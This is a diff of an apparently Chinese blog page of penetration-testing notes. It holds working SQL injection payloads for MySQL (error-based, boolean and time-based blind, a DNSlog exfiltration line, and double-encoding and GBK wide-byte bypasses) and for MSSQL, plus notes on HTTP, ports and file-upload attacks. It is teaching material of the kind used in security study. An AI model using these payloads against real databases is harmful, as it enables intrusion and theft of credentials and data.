-<li>获取库名：1’ and (select * from (select count(<em>) ,concat(concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e),floor(rand(0)</em>2))x from information_schema.tables group by x)a)–+</li>
-<li>获取表名：1’ and (select * from (select count(<em>) ,concat(concat(0x7e,(select table_name from information_schema.tables where table_schema=”指定库名” limit 1,1),0x7e),floor(rand(0)</em>2))x from information_schema.tables group by x)a)–+</li>
-<li>获取列名：1’ and (select * from (select count(<em>) ,concat(concat(0x7e,(select column_name from information_schema.columns where table_schema=”指定库名” and table_name=”指定表名” limit 1,1),0x7e),floor(rand(0)</em>2))x from information_schema.tables group by x)a)–+</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>盲注之布尔注入</p>
-<ul>
-<li><blockquote>
-<p>条件判断 </p>
-</blockquote>
-</li>
-<li><blockquote>
-<p>if(1,2,3)  1是判断条件，2是条件为真的返回结果，3是条件为假的返回结果</p>
-</blockquote>
-</li>
-<li><blockquote>
-<p>语句：select if(1=1,’true’,’false’)   返回结果为true</p>
-</blockquote>
-</li>
-<li><blockquote>
-<pre><code>if(ascii(substr(查询语句,1,1)))=97,&apos;a&apos;,&apos;不是a&apos;）</code></pre></blockquote>
-<ul>
-<li>查询当前库名：先得到数据库名的长度<br>id=1’ and (length(database()))&gt;5 –+    若页面正常，则可判断当前数据库名称有5个字节<ul>
-<li>截取去码得到数据库的字符 改变n和m的值依次获取数据库名的字符 n表示起始位置，不能为0，m是对应的ASCII码值，具体值查看ASCII表<br>id=1’ and (ascii(substr(database(),n,1)))&gt;m –+  若页面正常，使用二分法判断第一个字符的ascii码值     land (ascii(substr(database(),n,1)))&gt;m –+</li>
-</ul>
-</li>
-<li>查询库名（先获取库名的数量，在获取库名长度）<br>id=1’ and (ascii(substr((select concat(schema_name) from information_schema.schemata limit 0,1),n,1)))&gt;m –+<br>一个个比对，使用burpsuit爆破</li>
-<li>查询表名（先获取表名的数量，在获取表名长度）<br>and (select count(*) from information_schema.tables where table_schema=database())&gt;5<br>and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;5<br>and (ascii(substr((select table_name from information_schema.tables where table_schema=databsae() limit 0,1),1,1)))&gt;100</li>
-<li>获取列名（先获取列名个数，再获取列名长度，最后获取列名）<br>and (ascii(substr((select column_name from information_schema.column where table_name=’users’ limit 0,1),1,1)))&gt;100</li>
-<li>获取数据<br>and (ascii(substr((select password from users limit 0,1),1,1)))=68</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>盲注之时间注入</p>
-<ul>
-<li><blockquote>
-<p>sleep(arg1)  arg1表示中断的时间，单位为秒</p>
-</blockquote>
-</li>
-<li><blockquote>
-<p>语句：select if(1=1,sleep(3),’goodbye’)</p>
-</blockquote>
-<ul>
-<li>先得到数据库名的长度<br>and if((length(database())&gt;5),sleep(5),0)<br>and if((length(database())=4),sleep(5),0)<ul>
-<li>改变n和m的值一次获取数据库名的字符<br>and if((ascii(substr(databsae(),n,1)))&gt;m,sleep(5),0)</li>
-</ul>
-</li>
-<li>获取数据库表名（同理先获取长度）<br>and if((ascii(substr((select table_name from information_schema.tables where </li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>+-table_schema=database() limit 0,1),1,1)))&gt;100,sleep(5),0)<br>            * 获取列名  ascii和substr与上面一条语句位置不同，但作用一样，都对<br>and if (select (ascii(substr(column_name,1,1))) from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1)&gt;100,sleep(5),0)<br>            * 获取数据<br>and if((ascii(substr((select password from users limit 0,1),1,1)))=68,sleep(5),0)<br>        * 盲注之dnslog注入<br>            * 1‘’ and select load_file(concat(‘\\‘,(select hex(user())),’.dns域名\abc’))  原理同上，执行不同的语句获得结果<br>        * 二次编码注入<br>            * 二次编码注入产生的过程<br>用户输入?id=1%2527 —&gt;经过php自身编码变为?id=1%27—&gt;此时经过addslashes()函数，mysql_real_escape_string(),mysql_escape_string()函数，为发现<br>单引号等特殊字符，未触发转义，输出仍为?id=1%27 —&gt;如果此时程序中使用了urldecode或者rawurldecode函数来解码id参数，输出结果为?id=1’，产生单引<br>号成功闭合，从而引发注入。<br>斜杠/  绕过  %255c<br>双引号 绕过  %2522<br>        * 宽字节(GBK编码)注入<br>         * &gt; 宽字节注入 -常见函数<br>         * &gt; 浏览器客户端和服务器都可以指定操作数据的编码类型<br>         * &gt; addslashes()<br>         * &gt; mysql_real_escape_string()<br>         * &gt; mysql_escape_string()   php5.3以及之后就废除了</p>
-<pre><code>        * ?id=-1%df&apos; union select 1,(select user()),3 --+  这是由单引号被自动转义成\&apos;，前面的%df和转移字符\反斜杠（%5c）组成了%df%5c，也就是’運‘字，这时候单引号还在，于是成功闭合了前面的单引号
-* MySQL语法
-    * 增
-        *          增库：create database 数据库名；
-     增表：create table 表名 (列名1 VARCHAR(30), 列名2 VARCHAR(20), 列名3 VARCHAR(20) 。。。。。);
-    增列内容：insert into 表名 value（列1的值，列2的值，，，，）；
-    增加列：alter table 表名 add column 列名 varchar(30);
-    * 删
-        *  删库：drop database 库名；
-删表：drop table 表名；
-删列内容：delete from 表名 where 限定条件；#where限定是bool型的限定，true的会被执行
-DELETE from name where age &lt;15;
-    * 改
-        * 改列内容：UPDATE  表名  SET  字段名1=值1[,字段名2=值2，...]  [WHERE 条件表达式]
-    * 查
-        *     查库：show databases；
-查表：show tables；
-查列属性：show columns from 表名；desc 表名；
-查列内容：select * from 表名；</code></pre><ul>
-<li><p>MSSQL数据库（端口1433）</p>
-<ul>
-<li>判断是否存在注入点<ul>
-<li>判断是否为mssql数据库<br>?id=1 and exists(select * from sysobjects)–</li>
-<li>判断是否支持堆叠注入<br>?id=1;declare @a int–</li>
-<li>获取数据库版本<br>?id=1 and 1=@@version–</li>
-<li>查看数据看当前用户的数据库权限<br>?id=1 and 1=(select is_srvrolemember(‘sysadmin’))–</li>
-<li>查看数据看当前用户的数据库权限<br>?id=1 and 1=(select is_member(‘db_owner’))–</li>
-<li>查询当前使用的数据库<br>?id=1 and 1=(db_name())</li>
-<li>获取数据库个数<br>?id=1 and 1=(select quotename(count(name))from master..sysdatabases)–</li>
-<li>查看所有数据库的名字<br>?id=1 and 1=(select name from master.dbo.sysdatabases where dbid=1)–</li>
-<li>一次性获取所有数据库名<br>?id=1 and 1=(select quotename(name)from master..sysdatabasesFOR XML PATH(‘’))–</li>
-<li>一次性获取所有数据库表名<br>?id=2 and 1=(select top 1 name from blogdb..sysobjects where xtype=’U’ FOR XML PATH(‘’))–</li>
-<li>一次性获取所有数据库列名<br>?id=1 and 1=(select quotename(name)from 数据库名..syscolumns where id=(select id from 数据库名..sysobjects where name=’指定表名’)FOR XML PATH(‘’))–</li>
-<li>获取所有数据库数据<br>?id=1 and 1=(select top 1 * from blogdb..user_info where userid=1 FOR XML PATH(‘’))–</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>ACCESS数据库(1521)</p>
-</li>
-<li><blockquote>
-<p>作为关系型数据库access和Mysql/mssql/Oracle等一样，都是库-&gt;表-&gt;列-&gt;内容，但是access的每一个库均为单独的一个文件。</p>
-</blockquote>
-<ul>
-<li>子主题 1<h3 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h3></li>
-</ul>
-</li>
-<li><p>mongoDB</p>
-<h2 id="概要-OSI模型分层"><a href="#概要-OSI模型分层" class="headerlink" title="概要: OSI模型分层"></a>概要: OSI模型分层</h2><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3></li>
-<li><p>GET请求头分析</p>
-<ul>
+<li>Thinkphp 5.x远程执行命令漏洞：<br><a href="https://www.cnblogs.com/backlion/p/10106676.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/10106676.html</a><h3 id="系统层面命令执行漏洞"><a href="#系统层面命令执行漏洞" class="headerlink" title="系统层面命令执行漏洞"></a>系统层面命令执行漏洞</h3>MS08-067<br>bash破壳漏洞<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="什么是代码执行："><a href="#什么是代码执行：" class="headerlink" title="什么是代码执行："></a>什么是代码执行：</h3>当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能够控制这个字符串，将造成代码注入漏洞。<br>在php中：eval，assert，preg_replace（’/*/e’，’$ret=”\1”;’,$data）；<br>在asp中：eval，exevute.executeglobal<br>在jsp中：jsp中没有php中的eval函数，但是可以使用反射机制，使用基于反射机制的表达式引擎，如0GNL，SpEL，MVEL等<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h2 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h2><h2 id="python学习"><a href="#python学习" class="headerlink" title="python学习"></a>python学习</h2><h2 id="概要-OSI模型分层"><a href="#概要-OSI模型分层" class="headerlink" title="概要: OSI模型分层"></a>概要: OSI模型分层</h2><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3></li>
+<li>GET请求头分析<ul>
 <li>User-Agent：浏览器及系统信息</li>
 <li>Accept：客户端支持的文件类型，如果为/表示任何类型。内容类型用MIMIE表示</li>
 <li>Accept-Language：zh-cn;  //zh-cn表示简体中文，zh表示中文</li>
@@ -706,8 +709,7 @@ DELETE from name where age &lt;15;
 <li>Connection：两种状态 close和keep-alive  ，在HTTP/1.1中默认是Keep-Alive</li>
 </ul>
 </li>
-<li><p>Response响应数据包</p>
-<ul>
+<li>Response响应数据包<ul>
 <li>1.状态码。 状态码由三位数字组成，第一个数字定义了响应的类别，共分为5种：<br>1xx：指示信息—表示请求已接收，继续处理<br>2xx：成功—表示请求已被成功接收/理解/接受<br>3xx：重定—要完成请求必须进行更进一步的操作<br>4xx:客户端错误—请求有语法错误或请求无法实现<br>5xx：服务器错误—服务器未能实现合法请求<ul>
 <li>301：永久移动。请求的资源已被永久的移动到新url，返回信息会包括新的URl，浏览器会自动定向到新URl，今后任何新的请求都应使用新的URl代替</li>
 <li>400：客户端请求的语法错误，服务器无法理解</li>
@@ -717,8 +719,7 @@ DELETE from name where age &lt;15;
 </li>
 </ul>
 </li>
-<li><p>21 FTP<br>22  SSH<br>23   Telnet<br>25  smtp<br>53   DNS<br>80   HTTP<br>443  HTTPS<br>1433 mssql<br>1521  Oracle<br>3306      mysql<br>3389     RDP  mstsc<br>8080 tomcat</p>
-<h2 id="概要-文件上传流程："><a href="#概要-文件上传流程：" class="headerlink" title="概要: 文件上传流程："></a>概要: 文件上传流程：</h2></li>
+<li>21 FTP<br>22  SSH<br>23   Telnet<br>25  smtp<br>53   DNS<br>80   HTTP<br>443  HTTPS<br>1433 mssql<br>1521  Oracle<br>3306      mysql<br>3389     RDP  mstsc<br>8080 tomcat<h2 id="概要-文件上传流程："><a href="#概要-文件上传流程：" class="headerlink" title="概要: 文件上传流程："></a>概要: 文件上传流程：</h2></li>
 </ul>
 <p>1.前端选择文件，进行提交   （JavaScript检测、flash as检测）<br>2.浏览器形成POST MultiPart报文发送到服务器    （WAF拦截、ips拦截）<br>3.服务器中间件接收到报文，解析后交给相关后端代码进行处理    （扩展名检测、00截断、MIME TYPE检测、文件格式检测、内容检测{同WAF/IPS}）<br>4.后端代码将上传的文件内容写入到临时文件中（PHP特有）<br>5.写入到文件中，文件名为提交的文件名或以一定规则生成的文件名      (文件重命名、杀毒软件查杀)<br>6.访问文件    （无执行权限、未知位置）</p>
 <p>文件上传漏洞的必要条件：<br>1.存在上传点<br>2.可以上传动态文件<br>3.上传目录有执行权限，并且上传的文件可执行<br>4.可访问到上传的动态文件</p>
@@ -735,7 +736,7 @@ DELETE from name where age &lt;15;
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%BB%E7%BB%93%20(@%E6%88%91%E8%A6%81%E5%8F%98%E8%B6%85%E4%BA%BA%20%20%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/">展开全文 >></a>
+          <a class="article-more-a" href="/2020/01/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%20(@%E6%88%91%E8%A6%81%E5%8F%98%E8%B6%85%E4%BA%BA%20%20%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/">展开全文 >></a>
         </p>
       
 
